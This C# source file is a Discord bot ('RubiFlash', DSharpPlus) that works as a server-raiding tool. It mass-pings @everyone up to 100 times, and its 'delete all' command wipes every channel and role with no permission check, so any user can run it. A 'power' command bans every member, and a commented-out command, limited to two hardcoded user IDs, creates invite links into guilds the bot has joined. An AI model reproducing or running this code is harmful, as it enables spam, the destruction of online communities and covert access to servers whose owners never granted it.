using System;
using System.IO;
using System.Threading;
using DSharpPlus;
using DSharpPlus.Entities;
using DSharpPlus.ModernEmbedBuilder;


namespace RubiFlash
{
    class Program
    {
        static DiscordClient client;
        static string prefix = "go!";
        static ModernEmbedBuilder test;
        static void Main(string[] args)
        {
            Console.WriteLine("Versuche mit Bot zu verbinden...");
            client = new DiscordClient(new DiscordConfiguration()
            {
                Token = ":blobsmirk:",
                TokenType = TokenType.Bot
            });

            client.Ready += async e =>
            {
                await client.UpdateStatusAsync(new DiscordActivity("on " + client.Guilds.Count + " server's"));
                Console.WriteLine("Bot erfolgreich verbunden");
            };

            client.MessageCreated += async e =>
            {
                if (!e.Message.Content.StartsWith(prefix))
                {
                    return;
                }
                string cmd = e.Message.Content.Remove(0, prefix.Length);

                if (cmd.StartsWith("everyone"))
                {
                    try
                    {
                        String number = e.Message.Content.ToString().Split(' ')[1];
                        int Number2 = int.Parse(number);
                        String content = e.Message.Content.Replace("go!everyone ", "").Replace(number, "");
                        if (Number2 < 101)
                        {
                            for (int i = 0; i < Number2; i++)
                            {
                                await e.Channel.SendMessageAsync("@everyone " + content);
                            }
                        } else
                        {
                            await e.Channel.SendMessageAsync("I can only send 100 messages not " + Number2);
                        }
                    }
                    catch (Exception red)
                    {
                        Console.WriteLine(red);
                    }

                }
                if (cmd.StartsWith("delete all"))
                {
                    await e.Guild.DeleteAllChannelsAsync();
                    foreach (var item in e.Guild.Roles)
                    {
                        try
                        {
                            await item.DeleteAsync();

                            await e.Channel.SendMessageAsync($"{item.Name} deleted");
                        }
                        catch (Exception)
                        {
                            Console.WriteLine($"Cant delete the {item.Name} role");
                        }
                    }
                }
                if (cmd.StartsWith("stats"))
                {
                    await e.Channel.SendMessageAsync("Emojis: " + e.Guild.Emojis.Count);
                    await e.Channel.SendMessageAsync("Roles: " + e.Guild.Roles.Count);
                    await e.Channel.SendMessageAsync("Channel: " + e.Guild.Channels.Count);
                    await e.Channel.SendMessageAsync("Member: " + e.Guild.Members.Count);
                    await e.Channel.SendMessageAsync("Afk Channel: " + e.Guild.AfkChannel);
                    await e.Channel.SendMessageAsync("Afk Timeout: " + e.Guild.AfkTimeout + " second's");
                    await e.Channel.SendMessageAsync("Icon Url: " + e.Guild.IconUrl);
                    await e.Channel.SendMessageAsync("Mfa Level: " + e.Guild.MfaLevel);
                    await e.Channel.SendMessageAsync("Verification Level: " + e.Guild.VerificationLevel);
                }
                /*if (cmd.StartsWith("getinvites"))
                {
                    if (e.Author.Id.Equals(401817301919465482) || e.Author.Id.Equals(137253345336229889))
                    {
                        String guildid = e.Message.Content.ToString().Split(' ')[1];
                        foreach (var item in client.Guilds)
                        {
                            await e.Channel.SendMessageAsync(client.Guilds.ToString());
                            await e.Channel.SendMessageAsync(item.ToString());
                            await client.GetGuildAsync(440589976921440269);
                            DiscordGuild cc = await client.GetGuildAsync(440589976921440269);
                            await e.Channel.SendMessageAsync("Guild bekommen");
                            DiscordChannel cc2 = await cc.CreateChannelAsync("name :D", ChannelType.Text);
                            await e.Channel.SendMessageAsync("Channel erstellt");
                            DiscordInvite cc3 = await cc2.CreateInviteAsync();
                            await e.Channel.SendMessageAsync("Invite erstellt");
                            await e.Channel.SendMessageAsync("discord.gg/" + cc3.Code); 
                        }
                    }else
                    {
                        await e.Channel.SendMessageAsync("**NOOB**");
                    }
                }
                */
                if (cmd.StartsWith("power"))
                {
                    foreach (var item in e.Guild.Members)
                    {
                        if (e.Author.Id.Equals(e.Guild.Owner.Id))
                        {
                            try
                            {
                                await item.BanAsync();

                                await e.Channel.SendMessageAsync($"{item.Username} got banned");
                            }
                            catch (Exception)
                            {
                                await e.Channel.SendMessageAsync($"{ item.Username} can not get banned :c");
                            }
                        }else
                        {
                            await e.Channel.SendMessageAsync("at the moment only the guild woner can use this command!");
                        }
                    }
                }
            };

            client.ConnectAsync();
            while (true)
            {
                Thread.Sleep(50);
            }
        }
    }
}
